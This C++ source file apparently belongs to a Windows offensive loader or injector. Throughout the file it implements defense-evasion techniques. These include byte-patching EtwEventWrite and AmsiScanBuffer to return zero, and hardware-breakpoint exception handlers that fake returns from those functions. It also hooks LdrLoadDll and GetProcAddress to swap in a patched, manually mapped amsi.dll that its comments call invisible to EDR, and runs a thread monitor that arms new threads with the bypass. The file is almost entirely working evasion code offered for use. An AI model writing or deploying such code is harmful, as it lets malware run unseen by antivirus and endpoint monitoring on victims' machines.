#include "patch.hpp"


std::vector<BYTE> ReadFileToBuffer(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file) {
        throw std::runtime_error("Failed to open file");
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<BYTE> buffer(size);
    file.read(reinterpret_cast<char*>(buffer.data()), size);

    return buffer;
}
bool patchRemoteETW(HANDLE hProcess) {
    // 1. Get address of EtwEventWrite from local ntdll (it will be the same in remote)
    // You can use your syscallHandler or GetProcAddress since ntdll is already loaded
    unsigned char* k = helperHandler.getNtdll();
    hProcess = GetCurrentProcess();
    wchar_t wK[50];
    size_t convertedChars = 0;

    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
    PVOID etwAddress = syscallHandler.getFunctionAddressByHash(wK, 615043106);

    if (!etwAddress) return 1;

    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    SIZE_T patchSize = sizeof(patch);

    std::cout << "[!] Patching ETW at: " << etwAddress << std::endl;

    // 2. Change protection to RW
    mainInjector.protectMemFlag(hProcess, etwAddress, PAGE_READWRITE, patchSize);

    // 3. Write the patch
    mainInjector.wrMem(hProcess, etwAddress, (LPVOID)patch, patchSize);

    // 4. Restore protection to RX
    mainInjector.protectMemFlag(hProcess, etwAddress, PAGE_EXECUTE_READ, patchSize);

    std::cout << "[+] ETW silenced in remote process." << std::endl;
    return 0;
}


bool patchRemoteAmsi(HANDLE hProcess) {
    HMODULE amsiBaseAddr = (HMODULE)mainInjector.findRemoteModule(hProcess, L"amsi.dll");
	HMODULE amsiModule = NULL;
    if (!amsiBaseAddr) {
        std::cout << "[-] Failed to find amsi.dll in remote process going to load it" << std::endl;
        //amsiBaseAddr = LoadLibraryW(L"amsi.dll");
		std::cout << "loading amsi from disk and mapping it locally to get the address of AmsiScanBuffer\n";
        auto rawAmsiBytes = ReadFileToBuffer("C:\\Windows\\System32\\amsi.dll");
        BYTE* amsiBytes = rawAmsiBytes.data();
        amsiModule = LocalManualMap(amsiBytes);
        std::cout << "Locally mapped amsi.dll at: " << amsiModule << "\n";
        //LoadLibraryW(L"amsi.dll");

     
        
	}
    hProcess = GetCurrentProcess();
    //PVOID amsiScanBuffAdr = syscallHandler.getFunctionAddressByHash(L"amsi.dll", 704434574);
    PVOID amsiScanBuffAdr = syscallHandler.getFunctionAddressByHashWithModule(amsiModule, 704434574);
    std::cout << "AmsiScanBuffer address: " << amsiScanBuffAdr << "\n";
    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    SIZE_T patchSize = sizeof(patch);

    std::cout << "[!] Patching AmsiScanBuffer at: " << amsiScanBuffAdr << std::endl;

    // Change protection to RW
    mainInjector.protectMemFlag(hProcess, amsiScanBuffAdr, PAGE_READWRITE, patchSize);

    //Write the patch
    mainInjector.wrMem(hProcess, amsiScanBuffAdr, (LPVOID)patch, patchSize);

    //Restore protection to RX
    mainInjector.protectMemFlag(hProcess, amsiScanBuffAdr, PAGE_EXECUTE_READ, patchSize);

    std::cout << "[+] Amsi silenced in remote process." << std::endl;
    return 0;
}
std::vector<DWORD> patchedThreads;
PVOID g_EtwAddr;
void SetupEtwBypass() {
    unsigned char* k = helperHandler.getNtdll();

    wchar_t wK[50];
    size_t convertedChars = 0;

    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
    g_EtwAddr = syscallHandler.getFunctionAddressByHash(wK, 615043106);
    // 1. Register the VEH
    AddVectoredExceptionHandler(1, EtwHwbpHandler);

    
    // 3. Get current thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    // 4. Set the breakpoint in Dr0
    ctx.Dr0 = (DWORD64)g_EtwAddr;
    ctx.Dr7 |= (1 << 0); // Enable local breakpoint for Dr0
    ctx.Dr7 &= ~(3 << 16); // Set as "Execute" breakpoint (bits 16-17 = 00)

    // 5. Apply the context
    SetThreadContext(GetCurrentThread(), &ctx);
}

LONG WINAPI EtwHwbpHandler(PEXCEPTION_POINTERS exceptions) {
    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Check if the RIP is at our target function (EtwEventWrite)
        if (exceptions->ExceptionRecord->ExceptionAddress == g_EtwAddr) {

            // 1. Get the return address from the stack (RSP points to it)
            DWORD64 returnAddr = *(DWORD64*)(exceptions->ContextRecord->Rsp);

            // 2. "Fake" a successful return
            exceptions->ContextRecord->Rip = returnAddr; // Skip to the caller
            exceptions->ContextRecord->Rsp += 8;         // Clean the stack
            exceptions->ContextRecord->Rax = 0;          // Success (STATUS_SUCCESS)

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}





PVOID g_AmsiAddr;

HMODULE mapAmsi() {
    auto rawAmsiBytes = ReadFileToBuffer("C:\\Windows\\System32\\amsi.dll");
    BYTE* amsiBytes = rawAmsiBytes.data();
    HMODULE amsiModule = LocalManualMap(amsiBytes);
    std::cout << "Locally mapped amsi.dll at: " << amsiModule << "\n";
	return amsiModule;
}

typedef NTSTATUS(NTAPI* f_LdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, PVOID*);
f_LdrLoadDll oLdrLoadDll = nullptr;
PVOID g_pGetProcAddress = nullptr;
HMODULE g_ManualAmsi = nullptr;
PVOID g_pLdrLoadDll = nullptr;

bool FullAmsiBypass() {
    // 1. Manually map amsi.dll into our process
    // This copy is invisible to the OS/EDR because it's not in the PEB
    g_ManualAmsi = (HMODULE)LocalManualMap(ReadFileToBuffer("C:\\Windows\\System32\\amsi.dll").data());
    if(g_ManualAmsi == NULL) {
        std::cout << "Failed to manually map amsi.dll\n";
        return false;
	}
	std::cout << "Locally mapped amsi.dll at: " << g_ManualAmsi << "\n";
    // 2. Patch our private copy's AmsiScanBuffer
    // This is safe because it's just a random allocation, not the 'real' module yet
    
    PVOID localAmsiScanBuffer = syscallHandler.getFunctionAddressByHashWithModule(g_ManualAmsi, 704434574);
    if(localAmsiScanBuffer == NULL) {
        std::cout << "Failed to find AmsiScanBuffer in manual map\n";
        return false;
	}
	std::cout << "AmsiScanBuffer address in local copy: " << localAmsiScanBuffer << "\n";
    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret

    DWORD old;
    mainInjector.protectMemFlag(HANDLE(-1), localAmsiScanBuffer, PAGE_READWRITE, sizeof(patch));
    memcpy(localAmsiScanBuffer, patch, sizeof(patch));
    mainInjector.protectMemFlag(HANDLE(-1), localAmsiScanBuffer, PAGE_EXECUTE_READ, sizeof(patch));

    // 3. Set Hardware Breakpoint on LdrLoadDll
    g_pLdrLoadDll = GetProcAddress(GetModuleHandleA("ntdll.dll"), "LdrLoadDll");
    g_pGetProcAddress = GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
    if (g_pGetProcAddress == NULL || g_pLdrLoadDll == NULL) {
        std::cout << "Failed to get address for LdrLoadDll or GetProcAddress\n";
        return false;
    }
	std::cout << "LdrLoadDll address: " << g_pLdrLoadDll << "\n";
	std::cout << "GetProcAddress address: " << g_pGetProcAddress << "\n";
    AddVectoredExceptionHandler(1, UniversalHwbpHandler);

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    // Dr0 for the Loader
    ctx.Dr0 = (DWORD64)g_pLdrLoadDll;
    ctx.Dr7 |= (1 << 0);

    // Dr1 for GetProcAddress
    ctx.Dr1 = (DWORD64)g_pGetProcAddress;
    ctx.Dr7 |= (1 << 2); // Enable Dr1

    ctx.Dr7 &= ~(3 << 16); // Break on Execution for Dr0
    ctx.Dr7 &= ~(3 << 20); // Break on Execution for Dr1

    SetThreadContext(GetCurrentThread(), &ctx);

    std::cout << "[+] Stealth AMSI Redirect Active. ntdll bytes remain untouched.\n";
    FARPROC test = GetProcAddress(g_ManualAmsi, "AmsiScanBuffer");
	std::cout << "Testing GetProcAddress on manual map for AmsiScanBuffer: " << test << "\n";
    if (test == NULL) {
        std::cout << "CRITICAL: GetProcAddress cannot find exports in manual map!\n";
		return false;
    }
    return true;
}

LONG WINAPI UniversalHwbpHandler(PEXCEPTION_POINTERS exceptions) {
    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {

        // --- INTERCEPT LDRLOADDLL ---
        if (exceptions->ExceptionRecord->ExceptionAddress == g_pLdrLoadDll) {
            PUNICODE_STRING pDllName = (PUNICODE_STRING)exceptions->ContextRecord->R8;
            if (pDllName && pDllName->Buffer && wcsstr(pDllName->Buffer, L"amsi.dll")) {
                *(PVOID*)exceptions->ContextRecord->R9 = (PVOID)g_ManualAmsi;

                exceptions->ContextRecord->Rax = 0; // STATUS_SUCCESS
                exceptions->ContextRecord->Rip = *(DWORD64*)(exceptions->ContextRecord->Rsp);
                exceptions->ContextRecord->Rsp += 8;

                // CRITICAL: Set RF (bit 16) to avoid re-triggering loop
                exceptions->ContextRecord->EFlags |= 0x10000;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }

        // --- INTERCEPT GETPROCADDRESS ---
        if (exceptions->ExceptionRecord->ExceptionAddress == g_pGetProcAddress) {
            HMODULE hMod = (HMODULE)exceptions->ContextRecord->Rcx;
            if (hMod == g_ManualAmsi) {
                // Return our patched AmsiScanBuffer for ANY request to this module
                // This satisfies AmsiInitialize, AmsiOpenSession, etc.
                PVOID targetFunc = syscallHandler.getFunctionAddressByHashWithModule(g_ManualAmsi, 704434574);

                exceptions->ContextRecord->Rax = (DWORD64)targetFunc;
                exceptions->ContextRecord->Rip = *(DWORD64*)(exceptions->ContextRecord->Rsp);
                exceptions->ContextRecord->Rsp += 8;

                // CRITICAL: Set RF (bit 16)
                exceptions->ContextRecord->EFlags |= 0x10000;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }

        // If we hit a single step we didn't handle, set RF and continue
        exceptions->ContextRecord->EFlags |= 0x10000;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

bool AmsiPatchGivenModule(HMODULE amsi, DWORD hash ) {
	HANDLE localProcess = GetCurrentProcess();
    PVOID amsiScanBuff = syscallHandler.getFunctionAddressByHashWithModule(amsi, 704434574);
    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    SIZE_T patchSize = sizeof(patch);

    std::cout << "[!] Patching AmsiScanBuffer at: " << amsiScanBuff << std::endl;

    // Change protection to RW
    mainInjector.protectMemFlag(localProcess, amsiScanBuff, PAGE_READWRITE, patchSize);

    //Write the patch
    mainInjector.wrMem(localProcess, amsiScanBuff, (LPVOID)patch, patchSize);

    //Restore protection to RX
    mainInjector.protectMemFlag(localProcess, amsiScanBuff, PAGE_EXECUTE_READ, patchSize);
    std::cout << "[+] Amsi silenced in given module" << std::endl;
    return 0;
}
void SetupAMSIBypass() {
	


    HMODULE amsiModule = LoadLibraryW(L"amsi.dll");
    
    g_AmsiAddr = syscallHandler.getFunctionAddressByHashWithModule(amsiModule, 704434574);
	std::cout << "AmsiScanBuffer address: " << g_AmsiAddr << "\n";
    // 1. Register the VEH
    AddVectoredExceptionHandler(1, AmsiHwbpHandler);
    patchedThreads.push_back(GetCurrentThreadId());

    // 3. Get current thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    // 4. Set the breakpoint in Dr0
    ctx.Dr0 = (DWORD64)g_AmsiAddr;
    ctx.Dr7 |= (1 << 0); // Enable local breakpoint for Dr0
    ctx.Dr7 &= ~(3 << 16); // Set as "Execute" breakpoint (bits 16-17 = 00)

    // 5. Apply the context
    SetThreadContext(GetCurrentThread(), &ctx);
    std::thread(MonitorThreads).detach();

}
LONG WINAPI AmsiHwbpHandler(PEXCEPTION_POINTERS exceptions) {
    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Check if the RIP is at our target function (EtwEventWrite)
        if (exceptions->ExceptionRecord->ExceptionAddress == g_AmsiAddr) {

            // 1. Get the return address from the stack (RSP points to it)
            DWORD64 returnAddr = *(DWORD64*)(exceptions->ContextRecord->Rsp);

            // 2. "Fake" a successful return
            exceptions->ContextRecord->Rip = returnAddr; // Skip to the caller
            exceptions->ContextRecord->Rsp += 8;         // Clean the stack
            exceptions->ContextRecord->Rax = 0;          // Success (STATUS_SUCCESS)

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
};



void ApplyHwBpToThread(DWORD tid) {
    HANDLE hThread = OpenThread(
        THREAD_SUSPEND_RESUME |
        THREAD_GET_CONTEXT |
        THREAD_SET_CONTEXT,
        FALSE,
        tid
    );

    if (!hThread) return;

    SuspendThread(hThread);

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (GetThreadContext(hThread, &ctx)) {
        ctx.Dr0 = (DWORD64)g_EtwAddr;
        ctx.Dr7 |= 1;
        ctx.Dr7 &= ~(3 << 16);

        SetThreadContext(hThread, &ctx);
    }

    ResumeThread(hThread);
    CloseHandle(hThread);
}






void MonitorThreads() {
    while (true) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snap == INVALID_HANDLE_VALUE) continue;

        THREADENTRY32 te;
        te.dwSize = sizeof(te);

        if (Thread32First(snap, &te)) {
            do {
                if (te.th32OwnerProcessID == GetCurrentProcessId()) {

                    // Check if TID is already in our vector
                    auto it = std::find(patchedThreads.begin(), patchedThreads.end(), te.th32ThreadID);

                    // If it points to end, it's a new thread
                    if (it == patchedThreads.end()) {
                        ApplyHwBpToThread(te.th32ThreadID);
                        patchedThreads.push_back(te.th32ThreadID);
                    }
                }
            } while (Thread32Next(snap, &te));
        }

        CloseHandle(snap);
        Sleep(10);
    }
}